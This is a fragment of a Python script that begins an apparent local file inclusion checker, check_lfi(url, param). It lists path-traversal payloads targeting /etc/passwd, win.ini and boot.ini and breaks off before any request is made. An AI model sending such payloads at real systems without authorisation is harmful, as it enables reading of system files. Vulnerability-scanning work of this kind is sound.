import requests

def check_lfi(url, param):
    
    payloads = [
        '../../../../../../etc/passwd',
        '../windows/win.ini',
        'C:\\boot.ini',
        'C:\\windows\\win.ini',
        '../../../../../../boot.ini'
    ]
    
    
